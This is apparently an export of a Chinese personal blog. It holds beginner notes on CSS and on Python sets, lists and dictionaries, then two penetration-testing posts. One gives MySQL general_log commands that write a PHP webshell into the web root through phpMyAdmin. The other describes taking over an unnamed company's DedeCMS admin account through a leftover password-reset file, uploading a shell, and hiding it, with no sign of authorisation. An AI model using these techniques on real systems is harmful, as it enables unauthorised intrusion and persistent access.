class="headerlink" title="连接的四种形态"></a>连接的四种形态</h2><p>超链接的样式是用a开头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:link --普通的未被访问的链接</span><br><span class="line">a:visited -用户已访问的链接</span><br><span class="line">a:hover -鼠标指针位于链接的上方悬停</span><br><span class="line">a:active - 链接被点击的时刻</span><br></pre></td></tr></table></figure><p>这种超链接或这种选择器的类型称为伪类选择器</p><p>这种位置分先后顺序的 l v h a</p><p><img src="/2018/11/05/css样式那些事/7.jpg" alt=""></p><p>四种状态下设置超链接样式时候的设置方式和设置顺序</p><p>a:hover也能做出简单的动画效果</p><p><img src="/2018/11/05/css样式那些事/8.jpg" alt=""></p><p>根据前面的学习不难看出 ，鼠标顶留在a标签文字上 字体放大 120% 这种简单的动画效果貌似还很常用的吧😁</p><h2 id="列表-表格样式"><a href="#列表-表格样式" class="headerlink" title="列表 表格样式"></a>列表 表格样式</h2><p>列表的样式吧 主要是list开头</p><p>列表的样式这里指无序列表(ul)和有序列表(ol) 共用样式有一下几种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list-style所有列表属性设置在这个声明中</span><br><span class="line"></span><br><span class="line">list-style-image为列表项设置图像</span><br><span class="line"></span><br><span class="line">list-style-position标志的位置</span><br><span class="line"></span><br><span class="line">list-style-type标志的类型</span><br></pre></td></tr></table></figure><h3 id="list-style-type-属性"><a href="#list-style-type-属性" class="headerlink" title="list-style-type 属性"></a>list-style-type 属性</h3><p>type属性对于有序和无序列表可以取得以下这些值</p><p><img src="/2018/11/05/css样式那些事/9.jpg" alt=""></p><p>前四种针对无序列表 后面针对有序列表</p><h3 id="list-style-position"><a href="#list-style-position" class="headerlink" title="list-style-position"></a>list-style-position</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list-style-position:inside</span><br><span class="line"></span><br><span class="line">list-style-position:outside</span><br></pre></td></tr></table></figure><p>两者区别在哪 用文字说可能比较抽象 我们用一张图表示更加明确</p><p><img src="/2018/11/05/css样式那些事/10.jpg" alt=""></p><p><u>inside</u> 标号是向右缩进到这个列表区域之内</p><p><u>outside</u> 是在列表的左侧</p><h3 id="list-style-image"><a href="#list-style-image" class="headerlink" title="list-style-image"></a>list-style-image</h3><p>image属性可以规定列表的标号是一个图片：<u><strong>list-style-image:url(“1.jpg”);</strong></u></p><p>可以起到美化页面的作用</p><h3 id="表格样式"><a href="#表格样式" class="headerlink" title="表格样式"></a>表格样式</h3><p>表格样式主要是设置表格的高和宽 这个大家应该都知道</p><p>还有一个经常是用的就是<u>border</u> 边框属性</p><p>还有一个非常重要的<u>border-collapse</u>属性 合并默认表格样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">table&#123;</span><br><span class="line">width:100px;</span><br><span class="line">height:100px;</span><br><span class="line">border:1px solid #eee ; //一个像素宽 实线显示 灰色 每个属性之间用空格隔开</span><br><span class="line">border-collapse:collapse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/11.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python学习笔记</title>
      <link href="/2018/10/29/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/10/29/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><img src="/2018/10/29/Python学习笔记/1.jpg" alt=""></p><p>入坑了python3 知识点颇多 看了一遍 看第二遍时候发现 和没看没什么两样 所以把某些知识点 记录一下 加深印象也方便 忘记时候查看</p><a id="more"></a><h1 id="组和数据类型"><a href="#组和数据类型" class="headerlink" title="组和数据类型"></a>组和数据类型</h1><h2 id="集合类型及操作"><a href="#集合类型及操作" class="headerlink" title="集合类型及操作"></a>集合类型及操作</h2><p>集合元素之间无序，每个元素唯一 不存在相同元素 ，集合元素是不可变数据类型，在Python中集合用{}表示，元素间用 “,”分隔</p><p>也可以用set()建立集合</p><p><img src="/2018/10/29/Python学习笔记/2.jpg" alt=""></p><p>set()将每个字符单独拆分 变成集合的元素</p><h3 id="集合操作符"><a href="#集合操作符" class="headerlink" title="集合操作符"></a>集合操作符</h3><p><img src="/2018/10/29/Python学习笔记/3.jpg" alt=""></p><p>可能有点难理解 那我们就打一下 </p><blockquote><blockquote><blockquote><p><code>a = {&quot;p&quot;,&quot;y&quot;,123}</code><br><code>b = set(&quot;pypy123&quot;)</code><br><code>a-b</code><br><code>{123}</code><br><code>b-a</code><br><code>{&#39;2&#39;, &#39;3&#39;, &#39;1&#39;}</code><br><code>a&amp;b</code><br><code>{&#39;y&#39;, &#39;p&#39;}</code><br><code>a|b</code><br><code>{&#39;3&#39;, &#39;1&#39;, &#39;2&#39;, &#39;y&#39;, 123, &#39;p&#39;}</code></p></blockquote></blockquote></blockquote><p>在四种基本操作符上python提供了增强操作符</p><p>通过四种操作符于赋值符号 来完成对集合s的更新</p><p><img src="/2018/10/29/Python学习笔记/4.jpg" alt=""></p><h3 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h3><p><code>s.add(x) 将x增加到集合s</code></p><p><code>s.discard(x) 从集合s中移除x 如果x不再集合s中，不报错</code></p><p><code>s.remove(x) 从集合s中移除x 如果x不再集合s中，报出KeyError</code></p><p><code>s.clear()移除s中所有元素</code></p><p><code>s.pop() 随机返回一个s元素 s为空则 报出KeyError</code></p><p><code>s.copy 返回集合s的一个副本</code></p><p><code>len(s) 返回集合s的元素个数</code></p><p><code>x in s 判断x是否在s中 是则True 否则False</code></p><p><code>set(x)将其他类型变量转换为集合</code></p><h3 id="集合类型总结"><a href="#集合类型总结" class="headerlink" title="集合类型总结"></a>集合类型总结</h3><p>集合类型 适用于包含关系的比较</p><p>举个例子</p><p><img src="/2018/10/29/Python学习笔记/5.jpg" alt=""></p><p>还有一个非常重要的 <u>数据去重</u> 就是利用 集合类型不能重复的特点</p><p>例如将一个List 去掉其中的重复元素 这里就可以用集合进行数据去重 非常简单容易</p><p><img src="/2018/10/29/Python学习笔记/6.jpg" alt=""></p><p>这里先用set 将list转换成集合来达到了 去重的目的 然后将集合在转换为列表。</p><h2 id="序列类型及操作"><a href="#序列类型及操作" class="headerlink" title="序列类型及操作"></a>序列类型及操作</h2><p>序列类型包括 字符串类型 元组类型和列表类型</p><h3 id="序列操作符"><a href="#序列操作符" class="headerlink" title="序列操作符"></a>序列操作符</h3><p><code>x in s 如果x是序列s的元素则返回True 否则返回Fals</code></p><p><code>s+t 链接两个序列 s+t</code></p><p><code>s * n或n * s 将序列s复制n次</code></p><p><code>s[i] 索引返回s中的第i个元素</code></p><p><code>s[i:j:k] 切片返回序列s中 i到j 且步长为k的元素序列</code></p><h3 id="序列函数和方法"><a href="#序列函数和方法" class="headerlink" title="序列函数和方法"></a>序列函数和方法</h3><p>len(s) 返回序列s的长度</p><p>min(s) 返回序列s的最小元素</p><p>max(s) 返回序列s的最大元素</p><p>s.count(x) 返回序列s中出现x的次数</p><h3 id="元组类型及操作"><a href="#元组类型及操作" class="headerlink" title="元组类型及操作"></a>元组类型及操作</h3><p>元组是序列类型的一种,使用() 或tuple()创建 </p><p><img src="/2018/10/29/Python学习笔记/7.jpg" alt=""></p><p>元素间用,分隔。元组创建以后不能修改</p><p>元组继承了序列全部通用操作 </p><h3 id="列表类型及操作"><a href="#列表类型及操作" class="headerlink" title="列表类型及操作"></a>列表类型及操作</h3><p>列表是序列类型的一种,使用[] 或list()创建 </p><p><img src="/2018/10/29/Python学习笔记/8.jpg" alt=""></p><p>元素间用,分隔。列表创建可以随意修改</p><h3 id="列表类型操作函数和方法"><a href="#列表类型操作函数和方法" class="headerlink" title="列表类型操作函数和方法"></a>列表类型操作函数和方法</h3><p>到这里内容很多 一会还要去上课 (其实是懒得打了)就从网上找了两张图 很详细</p><p><img src="/2018/10/29/Python学习笔记/9.jpg" alt=""></p><p><img src="/2018/10/29/Python学习笔记/10.jpg" alt=""></p><h3 id="序列类型总结"><a href="#序列类型总结" class="headerlink" title="序列类型总结"></a>序列类型总结</h3><p>序列类型 包括字符串 列表 元组</p><p>元组操作于序列基本相似，列表的话再序列基础上增加很多 更加灵活 </p><h2 id="字典类型及操作"><a href="#字典类型及操作" class="headerlink" title="字典类型及操作"></a>字典类型及操作</h2><h3 id="字典类型的定义"><a href="#字典类型的定义" class="headerlink" title="字典类型的定义"></a>字典类型的定义</h3><p>映射是一种键(索引)和值(数据)的对应</p><p>​    “城市”:”北京”</p><p>​    “姓名”:”周某人”</p><p>字典是键值对的集合，键值对之间无序</p><p>键值对：键是数据索引的扩展</p><p>采用{}和dict()创建键值对用·冒号:表示</p><p><img src="/2018/10/29/Python学习笔记/11.jpg" alt=""></p><p>在字典变量中通过建获得值 a[“中国”] 则会出现北京</p><h3 id="字典类型操作函数和方法"><a href="#字典类型操作函数和方法" class="headerlink" title="字典类型操作函数和方法"></a>字典类型操作函数和方法</h3><p><img src="/2018/10/29/Python学习笔记/12.jpg" alt=""></p><p><img src="/2018/10/29/Python学习笔记/13.jpg" alt=""></p><h3 id="字典类型的应用场景"><a href="#字典类型的应用场景" class="headerlink" title="字典类型的应用场景"></a>字典类型的应用场景</h3><p>统计数据出现的次数，数据是键 次数是值</p><p>主要作用：表达键值对数据 进而操作</p><h3 id="字典类型总结"><a href="#字典类型总结" class="headerlink" title="字典类型总结"></a>字典类型总结</h3><p>映射关系采用键值对表示</p><p>字典类型采用{}和dict()创建 键值对之间用:隔开</p><p>d[key] 既可以索引也可以赋值</p><p>牢记字典类型的操作函数</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php myadmin写shell</title>
      <link href="/2018/08/26/php%20myadmin%E5%86%99shell/"/>
      <url>/2018/08/26/php%20myadmin%E5%86%99shell/</url>
      <content type="html"><![CDATA[<p>有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。 </p><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p><img src="/2018/08/26/php myadmin写shell/1.png" alt=""></p>  <a id="more"></a> <h3 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h3><p>登陆进php myadmin 有些朋友可能会直接选择去写入一个webshell 执行后会弹出大概无法写入的意思 这里和php myadmin的设置有关系 在实战情况下一般都不能直接去写入一个shell的。</p><p>这时候我们需要换个思路</p><h3 id="利用mysql-错误日志写入一句话"><a href="#利用mysql-错误日志写入一句话" class="headerlink" title="利用mysql 错误日志写入一句话"></a>利用mysql 错误日志写入一句话</h3><p>这里需要先设置 general log (日志保存状态)general log file(日志保存路径)</p><p>先执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;general%&apos; a</span><br></pre></td></tr></table></figure><p><img src="/2018/08/26/php myadmin写shell/2.png" alt=""></p><p>我们需要把general log 改为ON 也就是打开状态</p><p>还要把general log file路径改为网站的根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;; </span><br><span class="line"></span><br><span class="line">set global general_log_file=&apos;D:/stduy/PHPTutorial/WWW/infos.php&apos;;</span><br></pre></td></tr></table></figure><p><img src="/2018/08/26/php myadmin写shell/3.png" alt=""></p><p>执行完后因为我是本地搭建环境所以可以看到成功创建了</p><p><img src="/2018/08/26/php myadmin写shell/4.png" alt=""></p><p>现在我们只需要输入一个错误的sql语句即可 这里我写入一句话 可以看到一句话已经存在于infos.php里面了</p><p><img src="/2018/08/26/php myadmin写shell/5.png" alt=""></p><p>之后我们菜刀直接链接即可</p><p><img src="/2018/08/26/php myadmin写shell/6.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>网上有许多相关的文章 不过自己写一遍印象才会更深刻吧</p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php myadmin </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透某企业</title>
      <link href="/2018/08/09/%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A/"/>
      <url>/2018/08/09/%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A/</url>
      <content type="html"><![CDATA[<p>在家无聊，突然想到博客搞上也有数天 没时间写文章，今天正好无聊</p><h2 id="实战内容"><a href="#实战内容" class="headerlink" title="实战内容"></a>实战内容</h2><h3 id="确定目标站"><a href="#确定目标站" class="headerlink" title="确定目标站"></a>确定目标站</h3><p><img src="/2018/08/09/渗透某企业/1.png" alt=""></p><a id="more"></a><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>相信很多人吧都会忽略信息收集这一块，完整的信息收集应该包括</p><p>收集 whois 邮箱</p><p>收集 子域名 c段 旁站</p><p>收集网站架构 运行的服务 对应的端口 探测 waf</p><p>google hacking 敏感文件</p><p> 收集网站的 cms 信息</p><h3 id="有所发现"><a href="#有所发现" class="headerlink" title="有所发现"></a>有所发现</h3><p>在信息收集的过程中我发现网站右上脚有</p><p><img src="/2018/08/09/渗透某企业/2.png" alt=""></p><p>因为主站是伪静态 我本人确实很排斥这种伪静态 我就点了英文版的站 就发现 </p><p>主站的url:<a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a></p><p>英文版url:<a href="http://www.xxx.com/en" target="_blank" rel="noopener">www.xxx.com/en</a></p><p>原来是分目录 English的站并没有做伪静态</p><p>准备对准他下手 习惯性的先扫描一番</p><p><img src="/2018/08/09/渗透某企业/3.png" alt=""></p><p>我发现了此文件 ,打开一看我尼玛 管理员真的粗心,是一个密码重置，管理员居然没有删</p><p><img src="/2018/08/09/渗透某企业/4.png" alt=""></p><p>因为我知道有admin 所以第一步直接填了admin 第二步即可重置，改完密码直接进入后台</p><p><img src="/2018/08/09/渗透某企业/5.png" alt=""></p><h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><p>dede cms拿shell很简单 有个文件管理器直接可上传get shell</p><p><img src="/2018/08/09/渗透某企业/6.png" alt=""></p><p>拿到shell后可直接跨目录</p><p>因为信息收集我发现是apache 还有.htacces文件 可以更好的隐藏我们的shell 这里我就不演示了</p><p>此篇没有什么技术含量 只当是做个笔记而已</p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
